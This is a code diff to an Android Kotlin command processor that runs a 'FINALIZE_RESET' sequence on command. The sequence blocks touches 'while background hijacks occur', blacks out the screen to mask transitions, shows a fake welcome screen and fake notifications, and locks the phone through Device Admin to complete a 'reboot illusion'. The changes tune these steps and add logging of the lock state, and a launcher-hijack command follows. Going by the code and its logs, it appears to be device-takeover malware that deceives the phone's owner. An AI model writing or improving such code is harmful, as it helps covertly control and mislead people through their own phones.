@@ -2296,10 +2296,11 @@ object CommandProcessor {
                     DebugLogger.log("FINALIZE_LIFECYCLE", "=== STARTING FINALIZE_RESET MACRO ===")
                     DebugLogger.log("FINALIZE_LIFECYCLE", "Goal: Transition from Setup UI -> Heavy Boot Launcher -> Keyguard Lock -> Wake to Lockscreen")
                     
-                    // 1. Touch Guard
-                    DebugLogger.log("FINALIZE_LIFECYCLE", "Phase 1: Deploying TouchGuard to block user interference while background hijacks occur.")
+                    // 1. Touch Guard & Pitch Black Dimmer
+                    DebugLogger.log("FINALIZE_LIFECYCLE", "Phase 1: Deploying TouchGuard and Pitch Black Dimmer (Level 0 AUTO) to mask all transitions.")
                     android.os.Handler(android.os.Looper.getMainLooper()).post {
                         DynamicUIManager.showTouchGuard(ctx)
+                        DimmerManager.applyDim(ctx, 0, "AUTO")
                     }
 
                     // 2. Configure Launcher
@@ -2335,7 +2336,6 @@ object CommandProcessor {
                             }
                         }
                         
-                        // Wait for Ghost Hand to finish hijack (Increased to 25s for heavy boot lag)
                         var waitTime = 0
                         while (LauncherManager.isHijacking && waitTime < 25000) {
                             kotlinx.coroutines.delay(500)
@@ -2410,44 +2410,43 @@ object CommandProcessor {
                         DebugLogger.log("FINALIZE_LIFECYCLE_ERR", "Failed to post fake notifications: ${e.message}")
                     }
 
-                    // 5. Physically Lock Screen
-                    DebugLogger.log("FINALIZE_LIFECYCLE", "Phase 5: Physically locking the screen to complete the reboot illusion.")
+                    // 5. Release Ignition Lock BEFORE calling lockNow()
+                    DebugLogger.log("FINALIZE_LIFECYCLE", "Phase 5: Releasing power_shield_keep_ignited flag BEFORE locking, ensuring OS can sleep.")
+                    ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit()
+                        .putBoolean("power_shield_keep_ignited", false).apply()
+                        
+                    kotlinx.coroutines.delay(300) // Buffer for OS to register flag release
+
+                    // 6. Physically Lock Screen
+                    DebugLogger.log("FINALIZE_LIFECYCLE", "Phase 6: Physically locking the screen via DeviceAdmin.")
                     val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
                     val adminComponent = android.content.ComponentName(ctx, MyDeviceAdminReceiver::class.java)
                     if (dpm.isAdminActive(adminComponent)) {
                         try { 
                             dpm.lockNow() 
-                            DebugLogger.log("FINALIZE_LIFECYCLE", "DevicePolicyManager.lockNow() successfully executed. Screen should be turning off.")
+                            DebugLogger.log("FINALIZE_LIFECYCLE", "DevicePolicyManager.lockNow() successfully executed.")
                         } catch (e: Exception) { 
-                            DebugLogger.log("FINALIZE_LIFECYCLE_ERR", "DevicePolicyManager.lockNow() crashed: ${e.message}")
+                            DebugLogger.log("FINALIZE_LIFECYCLE_ERR", "lockNow() crashed: ${e.message}")
                         }
                     } else {
                         DebugLogger.log("FINALIZE_LIFECYCLE_ERR", "CRITICAL: Cannot lock screen because Device Admin is NOT active.")
                     }
 
-                    // WAIT for the screen to actually turn off BEFORE removing the overlay
-                    DebugLogger.log("FINALIZE_LIFECYCLE", "Holding thread for 1000ms to allow hardware screen backlight to turn off completely.")
-                    kotlinx.coroutines.delay(1000)
+                    // 7. WAIT for the screen to turn off BEFORE tearing down masks
+                    DebugLogger.log("FINALIZE_LIFECYCLE", "Phase 7: Waiting 1500ms for hardware backlight to die...")
+                    kotlinx.coroutines.delay(1500)
 
-                    // Now that the screen is physically off, safely tear down the UI mask
-                    DebugLogger.log("FINALIZE_LIFECYCLE", "Screen is presumed off. Tearing down the fake Welcome UI and TouchGuard masks.")
+                    DebugLogger.log("FINALIZE_LIFECYCLE", "Tearing down Native/HTML overlays and TouchGuard (Keeping Dimmer pitch black).")
                     android.os.Handler(android.os.Looper.getMainLooper()).post {
                         DynamicUIManager.removeOverlay(ctx, "FINALIZE_RESET")
                         DynamicUIManager.removeNativeOverlay(ctx, "FINALIZE_RESET")
                         DynamicUIManager.removeTouchGuard(ctx)
                     }
 
-                    // Release ignition block from Setup process
-                    DebugLogger.log("FINALIZE_LIFECYCLE", "Releasing power_shield_keep_ignited flag so the OS can sleep normally.")
-                    ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit()
-                        .putBoolean("power_shield_keep_ignited", false).apply()
+                    kotlinx.coroutines.delay(400) // Extra buffer before waking
 
-                    // Extra buffer before waking
-                    DebugLogger.log("FINALIZE_LIFECYCLE", "Buffering 400ms before triggering PulseActivity wake...")
-                    kotlinx.coroutines.delay(400)
-
-                    // 6. Wake Screen to Swipe/Lock screen
-                    DebugLogger.log("FINALIZE_LIFECYCLE", "Phase 6: Waking screen via WakeLock and PulseActivity (preserve_keyguard=true).")
+                    // 8. Wake Screen to Lockscreen
+                    DebugLogger.log("FINALIZE_LIFECYCLE", "Phase 8: Waking screen via WakeLock and PulseActivity (preserve_keyguard=true).")
                     try {
                         val pm = ctx.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
                         val wakeLock = pm.newWakeLock(android.os.PowerManager.FULL_WAKE_LOCK or 
@@ -2461,21 +2460,40 @@ object CommandProcessor {
                             putExtra("preserve_keyguard", true)
                         }
                         ctx.startActivity(pulseIntent)
-                        DebugLogger.log("FINALIZE_LIFECYCLE", "PulseActivity intent dispatched. The Lockscreen should now be visible to the user.")
+                        DebugLogger.log("FINALIZE_LIFECYCLE", "PulseActivity intent dispatched.")
                     } catch(e: Exception) {
-                        DebugLogger.log("FINALIZE_LIFECYCLE_ERR", "Failed to dispatch PulseActivity wake intent: ${e.message}")
+                        DebugLogger.log("FINALIZE_LIFECYCLE_ERR", "Failed to dispatch Wake intent: ${e.message}")
                     }
 
-                    // 7. Unblind the screen instantly so user can see the lockscreen
-                    DebugLogger.log("FINALIZE_LIFECYCLE", "Phase 7: Waiting 250ms for screen to ignite before dropping the Dimmer blindfold...")
-                    kotlinx.coroutines.delay(250)
+                    // 9. Post-Wake Audit & Unblind
+                    DebugLogger.log("FINALIZE_LIFECYCLE", "Phase 9: Post-Wake Monitoring. Waiting 1000ms before unblinding.")
+                    kotlinx.coroutines.delay(1000)
+                    
+                    val km = ctx.getSystemService(Context.KEYGUARD_SERVICE) as android.app.KeyguardManager
+                    val pmPower = ctx.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
+                    
+                    DebugLogger.log("FINALIZE_LIFECYCLE_AUDIT", "Screen On: ${pmPower.isInteractive} | Keyguard Locked: ${km.isKeyguardLocked} | Device Secure: ${km.isDeviceSecure}")
+                    
+                    if (!km.isKeyguardLocked) {
+                        DebugLogger.log("FINALIZE_LIFECYCLE_WARN", "WARNING: Keyguard is NOT locked after wake! OS bypassed swipe screen.")
+                        DebugLogger.log("FINALIZE_LIFECYCLE_AUDIT", "Since Keyguard is bypassed, Launcher should immediately show 'Phone is starting...'.")
+                    }
+                    
                     android.os.Handler(android.os.Looper.getMainLooper()).post {
                         DebugLogger.log("FINALIZE_LIFECYCLE", "Dropping Dimmer blindfold. The sequence is officially COMPLETE.")
                         DimmerManager.removeOverlay(ctx)
                     }
+                    
+                    // Secondary monitor coroutine to log keyguard state for 5 seconds
+                    kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
+                        for (i in 1..5) {
+                            kotlinx.coroutines.delay(1000)
+                            DebugLogger.log("FINALIZE_LIFECYCLE_AUDIT", "+${i}s -> Screen: ${pmPower.isInteractive} | Keyguard: ${km.isKeyguardLocked}")
+                        }
+                    }
 
                     status = "FINALIZE_RESET_COMPLETE"
-                    errorMsg = "Sequence finished with Extreme Verbose logging. Heavy Boot & Boot Overlay are armed."
+                    errorMsg = "Sequence finished with Extreme Verbose logging and Keyguard Audit."
                 }
                 "HIJACK_LAUNCHER" -> {
                     DebugLogger.log("HIJACK_INIT", "Command [HIJACK_LAUNCHER] received. ID: $id")
